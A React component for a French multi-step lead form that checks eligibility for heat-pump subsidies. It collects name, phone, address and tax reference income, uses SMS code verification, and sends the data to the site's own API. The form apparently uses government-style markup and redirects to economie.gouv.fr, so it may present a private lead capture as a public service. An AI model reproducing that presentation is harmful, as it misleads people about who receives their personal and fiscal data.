"use client";

import { useEffect, useRef, useState } from "react";
import type { TravauxKey } from "@/lib/campaigns";

interface LeadFormData {
  statutOccupation: "proprietaire" | "locataire" | "";
  typeLogement: "maison" | "appartement" | "";
  nomComplet: string;
  telephone: string;
  codePostal: string;
  adresse: string;
  email?: string;
  travaux?: TravauxKey;
  chauffageType?: "electrique" | "gaz" | "fioul" | "bois" | "pac" | "autre" | "";
  chauffageConso?: string;
  revenuFiscalRef?: string;
  leadId?: string;
  otpVerified?: boolean;
}

type FormStep = "pre" | "form" | "otp" | "heating" | "success" | "ineligible";

type LeadFormProps = {
  travaux: TravauxKey;
};

export default function LeadForm({ travaux }: LeadFormProps) {
  const sectionRef = useRef<HTMLElement | null>(null);
  const [formData, setFormData] = useState<LeadFormData>({
    statutOccupation: "",
    typeLogement: "",
    nomComplet: "",
    telephone: "",
    codePostal: "",
    adresse: "",
    email: "",
    chauffageType: "",
    chauffageConso: "",
    revenuFiscalRef: "",
  });
  const [currentStep, setCurrentStep] = useState<FormStep>("pre");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSendingOTP, setIsSendingOTP] = useState(false);
  const [isVerifyingOTP, setIsVerifyingOTP] = useState(false);
  const [otpCode, setOtpCode] = useState("");
  const [submitError, setSubmitError] = useState<string>("");
  const [otpInfo, setOtpInfo] = useState<string>("");
  const [leadId, setLeadId] = useState<string>("");
  const [otpCooldown, setOtpCooldown] = useState(0);
  const [adresseSuggestions, setAdresseSuggestions] = useState<string[]>([]);
  const [codePostalSuggestions, setCodePostalSuggestions] = useState<string[]>([]);
  const [isFetchingAdresse, setIsFetchingAdresse] = useState(false);
  const [isFetchingCodePostal, setIsFetchingCodePostal] = useState(false);
  const lastSelectedAdresse = useRef<string>("");
  const lastSelectedCodePostal = useRef<string>("");
  const isNotEligible =
    formData.statutOccupation === "locataire" || formData.typeLogement === "appartement";

  useEffect(() => {
    if (
      currentStep !== "form" &&
      currentStep !== "otp" &&
      currentStep !== "heating" &&
      currentStep !== "success" &&
      currentStep !== "ineligible"
    ) {
      return;
    }

    const section = sectionRef.current;
    if (!section) {
      return;
    }

    const scrollToSection = () => {
      const y = section.getBoundingClientRect().top + window.scrollY - 80;
      window.scrollTo({ top: y, behavior: "smooth" });
    };

    requestAnimationFrame(scrollToSection);
    setTimeout(scrollToSection, 0);
  }, [currentStep]);

  useEffect(() => {
    if (otpCooldown <= 0) {
      return;
    }

    const timer = setInterval(() => {
      setOtpCooldown((prev) => Math.max(prev - 1, 0));
    }, 1000);

    return () => clearInterval(timer);
  }, [otpCooldown]);

  useEffect(() => {
    const query = formData.adresse.trim();
    if (query.length < 3) {
      setAdresseSuggestions([]);
      return;
    }

    if (lastSelectedAdresse.current && lastSelectedAdresse.current === query) {
      lastSelectedAdresse.current = "";
      setAdresseSuggestions([]);
      return;
    }

    const timeout = setTimeout(async () => {
      setIsFetchingAdresse(true);
      try {
        const response = await fetch(
          `https://api-adresse.data.gouv.fr/search/?q=${encodeURIComponent(query)}&limit=5`
        );
        const data = await response.json();
        const suggestions = Array.isArray(data.features)
          ? data.features
              .map((feature: any) => feature?.properties?.label)
              .filter((label: string) => typeof label === "string")
          : [];
        setAdresseSuggestions(suggestions);
      } catch {
        setAdresseSuggestions([]);
      } finally {
        setIsFetchingAdresse(false);
      }
    }, 300);

    return () => clearTimeout(timeout);
  }, [formData.adresse]);

  useEffect(() => {
    const query = formData.codePostal.trim();
    if (query.length < 2) {
      setCodePostalSuggestions([]);
      return;
    }

    if (lastSelectedCodePostal.current && lastSelectedCodePostal.current === query) {
      lastSelectedCodePostal.current = "";
      setCodePostalSuggestions([]);
      return;
    }

    const timeout = setTimeout(async () => {
      setIsFetchingCodePostal(true);
      try {
        const response = await fetch(
          `https://api-adresse.data.gouv.fr/search/?q=${encodeURIComponent(query)}&type=municipality&limit=5`
        );
        const data = await response.json();
        const suggestions = Array.isArray(data.features)
          ? data.features
              .map((feature: any) => {
                const postcode = feature?.properties?.postcode;
                const city = feature?.properties?.city || feature?.properties?.citycode;
                if (!postcode) {
                  return null;
                }
                return city ? `${postcode} ${city}` : `${postcode}`;
              })
              .filter((label: string | null) => typeof label === "string")
          : [];
        setCodePostalSuggestions(suggestions as string[]);
      } catch {
        setCodePostalSuggestions([]);
      } finally {
        setIsFetchingCodePostal(false);
      }
    }, 300);

    return () => clearTimeout(timeout);
  }, [formData.codePostal]);

  const formatPhoneNumber = (value: string): string => {
    let cleaned = value.replace(/\D/g, "");

    if (cleaned.startsWith("0033")) {
      cleaned = `0${cleaned.slice(4)}`;
    } else if (cleaned.startsWith("33") && cleaned.length >= 11) {
      cleaned = `0${cleaned.slice(2)}`;
    }

    const limited = cleaned.slice(0, 10);
    
    if (limited.length === 0) return "";
    if (limited.length <= 2) return limited;
    if (limited.length <= 4) return `${limited.slice(0, 2)} ${limited.slice(2)}`;
    if (limited.length <= 6) return `${limited.slice(0, 2)} ${limited.slice(2, 4)} ${limited.slice(4)}`;
    if (limited.length <= 8) return `${limited.slice(0, 2)} ${limited.slice(2, 4)} ${limited.slice(4, 6)} ${limited.slice(6)}`;
    return `${limited.slice(0, 2)} ${limited.slice(2, 4)} ${limited.slice(4, 6)} ${limited.slice(6, 8)} ${limited.slice(8)}`;
  };

  const createLeadId = () => {
    if (typeof crypto !== "undefined" && "randomUUID" in crypto) {
      return crypto.randomUUID();
    }
    return `lead_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
  };

  const sendOtpRequest = async (moveToOtp: boolean) => {
    setSubmitError("");
    setOtpInfo("");
    setIsSendingOTP(true);

    try {
      const otpResponse = await fetch("/api/otp", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ telephone: formData.telephone }),
      });

      const otpData = await otpResponse.json();

      if (!otpResponse.ok) {
        throw new Error(otpData.error || "Erreur lors de l'envoi du code OTP");
      }

      setOtpInfo("Code envoyé par SMS. Il est valide 5 minutes.");
      setOtpCooldown(20);
      if (moveToOtp) {
        setCurrentStep("otp");
      }
    } catch (error) {
      setSubmitError(error instanceof Error ? error.message : "Une erreur est survenue. Veuillez réessayer.");
    } finally {
      setIsSendingOTP(false);
    }
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setSubmitError("");
    setOtpInfo("");
    const form = e.currentTarget;
    if (!form.checkValidity()) {
      form.reportValidity();
      return;
    }
    setIsSubmitting(true);

    const currentLeadId = leadId || createLeadId();
    setLeadId(currentLeadId);

    try {
      if (isNotEligible) {
        setCurrentStep("ineligible");
        return;
      }

      // Afficher l'OTP immédiatement pour éviter l'attente
      setCurrentStep("otp");

      const leadPromise = fetch("/api/leads", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          ...formData,
          travaux,
          leadId: currentLeadId,
          otpVerified: false,
        }),
      })
        .then(async (response) => {
          const data = await response.json();
          if (!response.ok) {
            throw new Error(data.error || "Erreur lors de l'envoi du formulaire");
          }
        })
        .catch((error) => {
          setSubmitError(error instanceof Error ? error.message : "Une erreur est survenue. Veuillez réessayer.");
        });

      const otpPromise = sendOtpRequest(false);

      await Promise.allSettled([leadPromise, otpPromise]);
    } catch (error) {
      setSubmitError(error instanceof Error ? error.message : "Une erreur est survenue. Veuillez réessayer.");
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleOTPSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setSubmitError("");
    const form = e.currentTarget;
    if (!form.checkValidity()) {
      form.reportValidity();
      return;
    }
    setIsVerifyingOTP(true);

    try {
      // Vérifier le code OTP
      const verifyResponse = await fetch("/api/otp", {
        method: "PUT",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          telephone: formData.telephone,
          code: otpCode,
        }),
      });

      const verifyData = await verifyResponse.json();

      if (!verifyResponse.ok) {
        throw new Error(verifyData.error || "Code OTP incorrect");
      }

      // Code OTP valide, mettre à jour le lead
      const leadResponse = await fetch("/api/leads", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          ...formData,
          travaux,
          leadId: leadId || createLeadId(),
          otpVerified: true,
        }),
      });

      const leadData = await leadResponse.json();

      if (!leadResponse.ok) {
        throw new Error(leadData.error || "Erreur lors de l'envoi du formulaire");
      }

      // Succès OTP → demander chauffage
      setCurrentStep("heating");
    } catch (error) {
      setSubmitError(error instanceof Error ? error.message : "Une erreur est survenue. Veuillez réessayer.");
      setOtpInfo("");
      setOtpCode(""); // Réinitialiser le code en cas d'erreur
    } finally {
      setIsVerifyingOTP(false);
    }
  };

  const handleHeatingSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setSubmitError("");
    const form = e.currentTarget;
    if (!form.checkValidity()) {
      form.reportValidity();
      return;
    }
    setIsSubmitting(true);

    try {
      const leadResponse = await fetch("/api/leads", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          ...formData,
          travaux,
          leadId: leadId || createLeadId(),
          otpVerified: true,
        }),
      });

      const leadData = await leadResponse.json();

      if (!leadResponse.ok) {
        throw new Error(leadData.error || "Erreur lors de l'envoi du formulaire");
      }

      setCurrentStep("success");

      // Redirection après 2 secondes
      setTimeout(() => {
        window.location.href = "https://www.economie.gouv.fr/particuliers";
      }, 2000);
    } catch (error) {
      setSubmitError(error instanceof Error ? error.message : "Une erreur est survenue. Veuillez réessayer.");
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleResendOTP = async () => {
    setOtpCode("");
    await sendOtpRequest(false);
  };

  if (currentStep === "ineligible") {
    return (
      <section ref={sectionRef} className="section-spacing form-section-mobile" id="formulaire-eligibilite" style={{ backgroundColor: "#f6f6f6" }} tabIndex={-1}>
        <div className="fr-container">
          <div className="fr-grid-row fr-grid-row--center">
            <div className="fr-col-12 fr-col-md-8">
              <div className="fr-alert fr-alert--error fr-mb-4w" role="alert">
                <h3 className="fr-alert__title">Non éligible aux aides</h3>
                <p>
                  Selon les informations fournies, les aides ne sont pas disponibles pour les locataires
                  ou les appartements.
                </p>
              </div>
              <div className="fr-btns-group fr-btns-group--center">
                <button
                  type="button"
                  className="fr-btn fr-btn--secondary"
                  onClick={() => {
                    setCurrentStep("pre");
                    setSubmitError("");
                    setOtpInfo("");
                  }}
                >
                  Modifier mes réponses
                </button>
              </div>
            </div>
          </div>
        </div>
      </section>
    );
  }

  if (currentStep === "success") {
    return (
      <section ref={sectionRef} className="section-spacing" id="formulaire-eligibilite" style={{ backgroundColor: "#f6f6f6" }} tabIndex={-1}>
        <div className="fr-container">
          <div className="fr-grid-row fr-grid-row--center">
            <div className="fr-col-12 fr-col-md-8">
              <div className="fr-alert fr-alert--success fr-mb-4w" role="alert">
                <h3 className="fr-alert__title">Demande enregistrée</h3>
                <p>
                  Votre demande a été enregistrée avec succès. Vous allez être redirigé dans quelques instants.
                </p>
              </div>
            </div>
          </div>
        </div>
      </section>
    );
  }

  if (currentStep === "pre") {
    return (
      <section ref={sectionRef} className="section-spacing form-section-mobile" id="formulaire-eligibilite" style={{ backgroundColor: "#f6f6f6" }} tabIndex={-1}>
        <div className="fr-container">
          <div className="fr-grid-row fr-grid-row--center">
            <div className="fr-col-12 fr-col-md-10 fr-col-lg-8">
              <h2 className="fr-h2 fr-mb-2w fr-mb-md-3w">Avant de commencer</h2>
              <p className="fr-text fr-mb-3w fr-mb-md-4w">
                Répondez à ces deux questions pour vérifier votre éligibilité.
              </p>

              <div className="fr-input-group">
                <label className="fr-label">
                  Statut d'occupation <span className="fr-hint-text">(obligatoire)</span>
                </label>
                <div className="choice-grid">
                  <button
                    type="button"
                    className={`choice-card ${
                      formData.statutOccupation === "proprietaire" ? "choice-card--selected" : ""
                    }`}
                    aria-pressed={formData.statutOccupation === "proprietaire"}
                    onClick={() => setFormData({ ...formData, statutOccupation: "proprietaire" })}
                  >
                    Propriétaire
                  </button>
                  <button
                    type="button"
                    className={`choice-card ${
                      formData.statutOccupation === "locataire" ? "choice-card--selected" : ""
                    }`}
                    aria-pressed={formData.statutOccupation === "locataire"}
                    onClick={() => setFormData({ ...formData, statutOccupation: "locataire" })}
                  >
                    Locataire
                  </button>
                </div>
              </div>

              <div className="fr-input-group fr-mt-3w fr-mt-md-4w">
                <label className="fr-label">
                  Type de logement <span className="fr-hint-text">(obligatoire)</span>
                </label>
                <div className="choice-grid">
                  <button
                    type="button"
                    className={`choice-card ${formData.typeLogement === "maison" ? "choice-card--selected" : ""}`}
                    aria-pressed={formData.typeLogement === "maison"}
                    onClick={() => setFormData({ ...formData, typeLogement: "maison" })}
                  >
                    Maison
                  </button>
                  <button
                    type="button"
                    className={`choice-card ${
                      formData.typeLogement === "appartement" ? "choice-card--selected" : ""
                    }`}
                    aria-pressed={formData.typeLogement === "appartement"}
                    onClick={() => setFormData({ ...formData, typeLogement: "appartement" })}
                  >
                    Appartement
                  </button>
                </div>
              </div>

              {isNotEligible && formData.statutOccupation && formData.typeLogement && (
                <div className="fr-alert fr-alert--error fr-mt-4w" role="alert">
                  <p>
                    Selon vos réponses, vous n'êtes pas éligible aux aides (locataire ou appartement).
                  </p>
                </div>
              )}

              <div className="fr-btns-group fr-btns-group--right fr-mt-4w fr-mt-md-5w">
                <button
                  type="button"
                  className="fr-btn fr-btn--primary"
                  disabled={!formData.statutOccupation || !formData.typeLogement || isNotEligible}
                  onClick={() => setCurrentStep(isNotEligible ? "ineligible" : "form")}
                >
                  Continuer
                </button>
              </div>
            </div>
          </div>
        </div>
      </section>
    );
  }

  if (currentStep === "otp") {
    return (
      <section ref={sectionRef} className="section-spacing form-section-mobile" id="formulaire-eligibilite" style={{ backgroundColor: "#f6f6f6" }} tabIndex={-1}>
        <div className="fr-container">
          <div className="fr-grid-row fr-grid-row--center">
            <div className="fr-col-12 fr-col-md-10 fr-col-lg-8">
              <h2 className="fr-h2 fr-mb-2w fr-mb-md-3w">Vérification du code</h2>
              <p className="fr-text fr-mb-3w fr-mb-md-4w">
                Un code de vérification à 4 chiffres a été envoyé au numéro {formData.telephone}. Il est valide 5 minutes.
              </p>

              <form onSubmit={handleOTPSubmit} noValidate className="form-mobile-optimized">
                <div className="fr-input-group">
                  <label className="fr-label" htmlFor="otp-code">
                    Code de vérification <span className="fr-hint-text">(obligatoire)</span>
                  </label>
                  <input
                    className="fr-input"
                    type="text"
                    id="otp-code"
                    name="otpCode"
                    value={otpCode}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, "").slice(0, 4);
                      setOtpCode(value);
                    }}
                    required
                    maxLength={4}
                    pattern="[0-9]{4}"
                    inputMode="numeric"
                    autoComplete="one-time-code"
                    placeholder="1234"
                    autoFocus
                  />
                  <p className="fr-hint-text">
                    Format : 4 chiffres
                  </p>
                </div>

                {otpInfo && (
                  <p className="fr-hint-text fr-mt-3w fr-mt-md-4w" role="status">
                    {otpInfo}
                  </p>
                )}

                {submitError && (
                  <p className="fr-error-text fr-mt-3w fr-mt-md-4w" role="alert">
                    {submitError}
                  </p>
                )}

                {otpCooldown > 0 && (
                  <p className="fr-hint-text fr-mt-2w" role="status">
                    Vous pourrez renvoyer le code dans {otpCooldown}s.
                  </p>
                )}

                <div className="fr-btns-group fr-btns-group--right fr-mt-4w fr-mt-md-5w">
                  <button
                    type="button"
                    className="fr-btn fr-btn--secondary"
                    onClick={handleResendOTP}
                    disabled={isSendingOTP || otpCooldown > 0}
                    aria-label="Renvoyer le code"
                  >
                    {isSendingOTP ? "Envoi du code..." : "Renvoyer le code"}
                  </button>
                  <button
                    type="button"
                    className="fr-btn fr-btn--secondary"
                    onClick={() => {
                      setCurrentStep("form");
                      setOtpCode("");
                      setSubmitError("");
                      setOtpInfo("");
                    }}
                  >
                    Retour
                  </button>
                  <button
                    type="submit"
                    className="fr-btn fr-btn--primary"
                    disabled={isVerifyingOTP || otpCode.length !== 4}
                    aria-label="Vérifier le code"
                  >
                    {isVerifyingOTP ? "Vérification en cours..." : "Vérifier le code"}
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>
      </section>
    );
  }

  if (currentStep === "heating") {
    return (
      <section ref={sectionRef} className="section-spacing form-section-mobile" id="formulaire-eligibilite" style={{ backgroundColor: "#f6f6f6" }} tabIndex={-1}>
        <div className="fr-container">
          <div className="fr-grid-row fr-grid-row--center">
            <div className="fr-col-12 fr-col-md-10 fr-col-lg-8">
              <h2 className="fr-h2 fr-mb-2w fr-mb-md-3w">Votre chauffage</h2>
              <p className="fr-text fr-mb-3w fr-mb-md-4w">
                Dernière étape : indiquez votre type de chauffage et votre consommation mensuelle.
              </p>

              <form onSubmit={handleHeatingSubmit} noValidate className="form-mobile-optimized">
                <div className="fr-input-group">
                  <label className="fr-label">
                    Type de chauffage <span className="fr-hint-text">(obligatoire)</span>
                  </label>
                  <div className="fr-radio-group">
                    <input
                      type="radio"
                      id="chauffage-electrique"
                      name="chauffageType"
                      value="electrique"
                      checked={formData.chauffageType === "electrique"}
                      onChange={() => setFormData({ ...formData, chauffageType: "electrique" })}
                      required
                    />
                    <label className="fr-label" htmlFor="chauffage-electrique">
                      Électrique
                    </label>
                  </div>
                  <div className="fr-radio-group">
                    <input
                      type="radio"
                      id="chauffage-gaz"
                      name="chauffageType"
                      value="gaz"
                      checked={formData.chauffageType === "gaz"}
                      onChange={() => setFormData({ ...formData, chauffageType: "gaz" })}
                      required
                    />
                    <label className="fr-label" htmlFor="chauffage-gaz">
                      Gaz
                    </label>
                  </div>
                  <div className="fr-radio-group">
                    <input
                      type="radio"
                      id="chauffage-fioul"
                      name="chauffageType"
                      value="fioul"
                      checked={formData.chauffageType === "fioul"}
                      onChange={() => setFormData({ ...formData, chauffageType: "fioul" })}
                      required
                    />
                    <label className="fr-label" htmlFor="chauffage-fioul">
                      Fioul
                    </label>
                  </div>
                  <div className="fr-radio-group">
                    <input
                      type="radio"
                      id="chauffage-bois"
                      name="chauffageType"
                      value="bois"
                      checked={formData.chauffageType === "bois"}
                      onChange={() => setFormData({ ...formData, chauffageType: "bois" })}
                      required
                    />
                    <label className="fr-label" htmlFor="chauffage-bois">
                      Bois
                    </label>
                  </div>
                  <div className="fr-radio-group">
                    <input
                      type="radio"
                      id="chauffage-pac"
                      name="chauffageType"
                      value="pac"
                      checked={formData.chauffageType === "pac"}
                      onChange={() => setFormData({ ...formData, chauffageType: "pac" })}
                      required
                    />
                    <label className="fr-label" htmlFor="chauffage-pac">
                      Pompe à chaleur
                    </label>
                  </div>
                  <div className="fr-radio-group">
                    <input
                      type="radio"
                      id="chauffage-autre"
                      name="chauffageType"
                      value="autre"
                      checked={formData.chauffageType === "autre"}
                      onChange={() => setFormData({ ...formData, chauffageType: "autre" })}
                      required
                    />
                    <label className="fr-label" htmlFor="chauffage-autre">
                      Autre
                    </label>
                  </div>
                </div>

                <div className="fr-input-group fr-mt-3w fr-mt-md-4w">
                  <label className="fr-label" htmlFor="chauffage-conso">
                    Consommation mensuelle en euros <span className="fr-hint-text">(obligatoire)</span>
                  </label>
                  <input
                    className="fr-input"
                    type="text"
                    id="chauffage-conso"
                    name="chauffageConso"
                    value={formData.chauffageConso}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^\d]/g, "").slice(0, 6);
                      setFormData({ ...formData, chauffageConso: value });
                    }}
                    required
                    inputMode="numeric"
                    placeholder="120"
                  />
                  <p className="fr-hint-text">Montant moyen par mois (en €).</p>
                </div>

                <div className="fr-input-group fr-mt-3w fr-mt-md-4w">
                  <label className="fr-label" htmlFor="revenu-fiscal-ref">
                    Revenu fiscal de référence <span className="fr-hint-text">(obligatoire)</span>
                  </label>
                  <input
                    className="fr-input"
                    type="text"
                    id="revenu-fiscal-ref"
                    name="revenuFiscalRef"
                    value={formData.revenuFiscalRef}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^\d]/g, "").slice(0, 10);
                      setFormData({ ...formData, revenuFiscalRef: value });
                    }}
                    required
                    inputMode="numeric"
                    placeholder="Ex : 22500"
                  />
                  <p className="fr-hint-text">Indiqué sur votre avis d'impôt.</p>
                </div>

                {submitError && (
                  <div className="fr-alert fr-alert--error fr-mt-3w fr-mt-md-4w" role="alert">
                    <p>{submitError}</p>
                  </div>
                )}

                <div className="fr-btns-group fr-btns-group--right fr-mt-4w fr-mt-md-5w">
                  <button
                    type="button"
                    className="fr-btn fr-btn--secondary"
                    onClick={() => {
                      setCurrentStep("otp");
                      setSubmitError("");
                    }}
                  >
                    Retour
                  </button>
                  <button
                    type="submit"
                    className="fr-btn fr-btn--primary"
                    disabled={
                      isSubmitting ||
                      !formData.chauffageType ||
                      !formData.chauffageConso ||
                      Number(formData.chauffageConso) <= 0 ||
                      !formData.revenuFiscalRef ||
                      Number(formData.revenuFiscalRef) <= 0
                    }
                  >
                    {isSubmitting ? "Envoi en cours..." : "Continuer"}
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>
      </section>
    );
  }

  return (
    <section ref={sectionRef} className="section-spacing form-section-mobile" id="formulaire-eligibilite" style={{ backgroundColor: "#f6f6f6" }} tabIndex={-1}>
      <div className="fr-container">
        <div className="fr-grid-row fr-grid-row--center">
          <div className="fr-col-12 fr-col-md-10 fr-col-lg-8">
            <h2 className="fr-h2 fr-mb-2w fr-mb-md-3w">Vérifier votre éligibilité</h2>
            <p className="fr-text fr-mb-3w fr-mb-md-4w">
              Remplissez le formulaire ci-dessous pour vérifier votre éligibilité aux aides pour l'installation d'une pompe à chaleur.
            </p>

            <form onSubmit={handleSubmit} noValidate className="form-mobile-optimized">

              <div className="fr-input-group">
                <label className="fr-label" htmlFor="nom-complet">
                  Nom et prénom <span className="fr-hint-text">(obligatoire)</span>
                </label>
                <input
                  className="fr-input"
                  type="text"
                  id="nom-complet"
                  name="nomComplet"
                  value={formData.nomComplet}
                  onChange={(e) => setFormData({ ...formData, nomComplet: e.target.value })}
                  required
                  autoComplete="name"
                />
              </div>

              <div className="fr-input-group fr-mt-3w fr-mt-md-4w">
                <label className="fr-label" htmlFor="telephone">
                  Téléphone <span className="fr-hint-text">(obligatoire)</span>
                </label>
                <input
                  className="fr-input"
                  type="tel"
                  id="telephone"
                  name="telephone"
                  value={formData.telephone}
                  onChange={(e) => {
                    const formatted = formatPhoneNumber(e.target.value);
                    setFormData({ ...formData, telephone: formatted });
                  }}
                  required
                  inputMode="tel"
                  autoComplete="tel"
                  maxLength={14}
                  placeholder="01 23 45 67 89"
                />
                <p className="fr-hint-text">
                  Format : 01 23 45 67 89
                </p>
              </div>

              <div className="fr-input-group fr-mt-3w fr-mt-md-4w">
                <label className="fr-label" htmlFor="code-postal">
                  Code postal <span className="fr-hint-text">(obligatoire)</span>
                </label>
                <input
                  className="fr-input"
                  type="text"
                  id="code-postal"
                  name="codePostal"
                  value={formData.codePostal}
                  onChange={(e) => {
                    const value = e.target.value.replace(/\D/g, "").slice(0, 5);
                    if (value && value !== formData.codePostal) {
                      lastSelectedCodePostal.current = "";
                    }
                    setFormData({ ...formData, codePostal: value });
                  }}
                  required
                  maxLength={5}
                  pattern="[0-9]{5}"
                  inputMode="numeric"
                  autoComplete="postal-code"
                  placeholder="75001"
                  list="code-postal-suggestions"
                />
                <p className="fr-hint-text">
                  Format : 5 chiffres (exemple : 75001)
                </p>
                {isFetchingCodePostal && (
                  <p className="fr-hint-text">Recherche en cours...</p>
                )}
                {codePostalSuggestions.length > 0 && (
                  <datalist id="code-postal-suggestions">
                    {codePostalSuggestions.map((suggestion) => (
                      <option key={suggestion} value={suggestion.split(" ")[0]}>
                        {suggestion}
                      </option>
                    ))}
                  </datalist>
                )}
              </div>

              <div className="fr-input-group fr-mt-3w fr-mt-md-4w">
                <label className="fr-label" htmlFor="adresse">
                  Adresse <span className="fr-hint-text">(obligatoire)</span>
                </label>
                <input
                  className="fr-input"
                  type="text"
                  id="adresse"
                  name="adresse"
                  value={formData.adresse}
                  onChange={(e) => setFormData({ ...formData, adresse: e.target.value })}
                  required
                  autoComplete="street-address"
                  placeholder="Numéro et nom de rue"
                />
                {isFetchingAdresse && (
                  <p className="fr-hint-text">Recherche en cours...</p>
                )}
                {adresseSuggestions.length > 0 && (
                  <ul className="suggestions-list" role="listbox">
                    {adresseSuggestions.map((suggestion) => (
                      <li key={suggestion}>
                        <button
                          type="button"
                          className="suggestion-item"
                          onClick={() => {
                            lastSelectedAdresse.current = suggestion;
                            setFormData({ ...formData, adresse: suggestion });
                            setAdresseSuggestions([]);
                          }}
                        >
                          {suggestion}
                        </button>
                      </li>
                    ))}
                  </ul>
                )}
              </div>

              <div className="fr-input-group fr-mt-3w fr-mt-md-4w">
                <label className="fr-label" htmlFor="email">
                  Email <span className="fr-hint-text">(optionnel)</span>
                </label>
                <input
                  className="fr-input"
                  type="email"
                  id="email"
                  name="email"
                  value={formData.email}
                  onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                  autoComplete="email"
                />
              </div>

              <div className="fr-alert fr-alert--info fr-mt-4w fr-mt-md-5w">
                <p className="fr-alert__title">Protection des données personnelles</p>
                <p className="fr-text--sm fr-mt-2w">
                  Les informations recueillies sont utilisées uniquement dans le cadre de cette démarche de vérification d'éligibilité aux aides publiques. Elles sont traitées conformément à la réglementation en vigueur sur la protection des données personnelles.
                </p>
              </div>

              {submitError && (
                <div className="fr-alert fr-alert--error fr-mt-3w fr-mt-md-4w" role="alert">
                  <p>{submitError}</p>
                </div>
              )}

              <div className="fr-btns-group fr-btns-group--right fr-mt-4w fr-mt-md-5w">
                <button
                  type="submit"
                  className="fr-btn fr-btn--primary"
                  disabled={isSubmitting}
                  aria-label="Soumettre le formulaire"
                >
                  {isSubmitting ? "Envoi en cours..." : "Vérifier mon éligibilité"}
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </section>
  );
}
